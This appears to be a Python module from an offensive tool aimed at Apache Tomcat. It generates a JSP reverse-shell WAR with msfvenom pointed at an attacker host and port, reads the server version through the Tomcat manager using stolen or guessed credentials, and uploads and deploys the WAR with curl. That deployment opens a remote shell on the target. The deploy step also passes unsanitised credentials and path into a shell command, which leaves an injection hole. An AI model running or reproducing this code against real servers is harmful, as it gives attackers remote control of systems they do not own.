import glob
import os
import subprocess
import requests
from requests.auth import HTTPBasicAuth

def generate_payload(filename: str, lhost: str, lport: str) -> str:
    resources_path = os.path.abspath("resources")

    war_files = glob.glob(os.path.join(resources_path, "*.war"))

    for war_file in war_files:
        if not 'web_shell.war' in war_file:
            os.remove(war_file)

    subprocess.run(
        ["msfvenom", "-p", "java/jsp_shell_reverse_tcp", f"LHOST={lhost}", f"LPORT={lport}",
         "-f", "war", "-o", f"{filename}.war"], cwd=resources_path, check=True, capture_output=True)

    return filename


def version_detection(url, **kwargs):

    if 'username' in kwargs and 'password' in kwargs:
        username = kwargs.get('username')
        password = kwargs.get('password')

        auth = HTTPBasicAuth(username, password)

        endpoint = '/manager/text/serverinfo'
        try:
            response = requests.get(f"{url}{endpoint}", auth=auth)

            if response.status_code == 200:
                info_dict = {}

                lines = response.text.splitlines()

                for line in lines[1:]:

                    key, value = line.split(":", 1)
                    key = key.strip()
                    value = value.strip().strip('[]')
                    info_dict[key] = value

                if 'Tomcat Version' in info_dict:
                    if 'output' in kwargs:
                        kwargs['output'].message("ongoing", f"{info_dict['Tomcat Version']}", url=endpoint)

            elif response.status_code == 403:
                print("USER CANT ACCESS TO CMD NEED TO CHECK IF HE CAN VIA GUI CHECK ROLES ETC")

        except requests.exceptions.ConnectionError as e:
            if 'Failed to resolve' in e:
                print('TOTO')

    # make an else statement for an unauthenticated version detection

def deploy(filename: str, path: str, url: str, username: str, password: str):
    resources_path = os.path.abspath("resources")

    command = f"curl --upload-file {filename}.war -u '{username}:{password}' '{url}/manager/text/deploy?path=/{path}'"
    subprocess.run(command, shell=True, check=True, capture_output=True, cwd=resources_path)
